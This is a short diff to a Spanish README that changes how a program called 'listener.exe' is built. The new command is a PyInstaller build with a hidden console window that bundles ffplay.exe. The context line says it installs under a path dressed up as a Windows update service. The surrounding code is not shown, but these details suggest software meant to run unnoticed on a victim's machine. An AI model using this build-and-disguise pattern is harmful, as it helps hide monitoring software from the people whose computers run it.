@@ -67,7 +67,8 @@ Instala el listener en `%APPDATA%\Microsoft\Windows\UpdateService\systemUpdater.
 ---
 
 ## Build listener.exe
+Nesesitas ffplay.exe para compilar
 
 ```bash
-pyinstaller listener.spec
+python -m PyInstaller --onefile --noconsole listener.py --add-binary "ffplay.exe;."
 ```
